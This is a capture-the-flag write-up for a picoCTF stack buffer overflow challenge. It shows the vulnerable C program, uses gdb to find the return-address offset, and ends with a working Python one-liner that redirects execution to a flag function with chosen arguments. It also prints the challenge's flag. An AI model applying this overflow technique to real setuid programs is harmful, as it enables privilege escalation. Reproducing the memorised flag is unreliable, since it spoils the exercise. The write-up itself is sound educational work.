This challenge memics `jump to libc` buffer overflow attack. If you want to exactly underestand it, then this is the best 
explination I have ever found [jump to libC by Dr.Du](https://youtu.be/LBo56Xyowvk?t=1240).

Challenge fils:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
flag.txt is protected and only accessable by vuln program, which is owned by `hacksports`. But we can run it as it is setUID program `s` flag is on, which allows any user to run it with the previllage of the owner.
```
ls -la
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 22:04 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-2_6    33 Sep 28 22:04 flag.txt
-rwxr-sr-x   1 hacksports overflow-2_6  7500 Sep 28 22:04 vuln
-rw-rw-r--   1 hacksports hacksports     794 Sep 28 22:04 vuln.c

```

Basiclly, we need to jump to `flag` function, but prepare the `arg1,arg2` on the correct place on the stack ($ebp+8,$ebp+12)
for the flag function.

The $ebp when flag is executed will be in the same position of the $eip (return pointer), see the lecture above by Dr. Du 
if you want to understand how this is the case.

*So what we can do is rewirte the return pointer, and jump 4 bytes then write the arg1, then arg2. 

1- let's first find the address of flag which is `080485e6`
```
$ gdb vuln
(gdb) p flag
```
or 
```
$ readelf  -s vuln | grep flag
```
2- Let's find the return address location
Method 1, just fill the buffer until you get sig fault.  
```
python -c 'print("A"*184)`|./vuln
Segmentation fault (core dumped)
```
That means the return address is 188 bytes from the beggining of the `buf`. 

Method 2, use gdb to print the difference between `$ebp` and `buf` then add 4 bytes (the size of the previouse frame pointer)
to get the location of the return address. 
```
$gdb vuln
(gdb) b vuln
(gdb) p $ebp
(gdb) p &buf
# for some reason I couldn't print buff, so I just fill it with AA then print the values below the $ebp to find where is it.

$gdb vuln
(gdb)disassemble vuln
(gdb)b *0x0804869a < break just after gets function>
(gdb)r
<enter>AAAAAAAAAAAAAA
(gdb)x/200x $ebp-200
< look for the first address that contains 0x41414141, the A's>
< you will find it 0xffd00e90, which is the address of buf>
(gdb)p/d $epb - 0xffd00e90
$1=184 < same value we get from method 1>
```
So the return address is 184+4bytes(previous frame pointer) bytes from the beggining of the buf.
3- Let's overflow the buffer
Now we have:
- The address of the flag function `080485e6`
- The location of the return pointer `188` bytes from the beggining of the buf
- The location of the arg1, and arg2 4 and 8 bytes above the return address (i.e. 202,206).
Or simply jump 4bytes after the return address then write arg1, then arg2. 
```
#188 A's + (return address) + (dump A's into 4bytes) + (first arg)+(second arg)
python -c 'import struct; print("A"*188+struct.pack("<I",0x080485e6)+"AAAA"+struct.pack("<I",0xDEADBEEF)+struct.pack("<I",0xC0DED00D))'|./vuln
picoCTF{arg5_and_r3turn55897b905}
```
Note: struct.pack `<I` is to put the value in little endian format in the memory. 



